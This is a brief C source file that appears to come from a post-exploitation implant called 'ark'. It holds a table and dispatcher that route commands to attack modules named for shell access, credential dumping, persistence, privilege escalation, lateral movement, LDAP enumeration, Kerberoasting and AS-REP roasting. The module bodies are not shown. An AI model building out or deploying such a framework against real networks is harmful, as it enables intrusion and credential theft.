#include <string.h>

#include "ark/modules.h"

static const struct {
    const char       *name;
    ark_module_fn  fn;
} g_modules[] = {
    { "shell",         ark_mod_shell },
    { "creds_dump",    ark_mod_creds_dump },
    { "cloud",         ark_mod_cloud },
    { "persist",       ark_mod_persist },
    { "privesc",       ark_mod_privesc },
    { "lateral_move",  ark_mod_lateral_move },
    { "ldap_enum",     ark_mod_ldap_enum },
    { "kerberoast",    ark_mod_kerberoast },
    { "asreproast",    ark_mod_asreproast },
};

int ark_module_execute(const char *name, const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    if (!name || !name[0]) return 0;
    for (size_t i = 0; i < sizeof(g_modules) / sizeof(g_modules[0]); i++) {
        if (strcmp(g_modules[i].name, name) == 0)
            return g_modules[i].fn(config, config_len, out, out_len);
    }
    return 0;
}